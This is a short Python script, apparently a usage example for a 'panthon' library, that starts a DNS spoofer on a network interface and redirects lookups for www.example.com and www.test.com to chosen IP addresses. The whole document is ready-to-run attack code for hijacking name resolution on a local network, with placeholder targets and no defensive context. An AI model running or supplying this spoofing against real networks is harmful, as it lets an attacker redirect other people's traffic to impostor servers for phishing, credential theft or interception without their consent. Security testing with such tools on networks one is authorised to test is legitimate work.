from panthon import DNSSpoofer

interface = "eth0"  # your network interface

# Specify the host you want to spoof DNS responses for and the IP to redirect to
spoofing_rules = {
    "www.example.com.": "192.0.2.0",
    "www.test.com.": "203.0.113.0",
}

dns_spoofer = DNSSpoofer(interface, spoofing_rules)
dns_spoofer.start()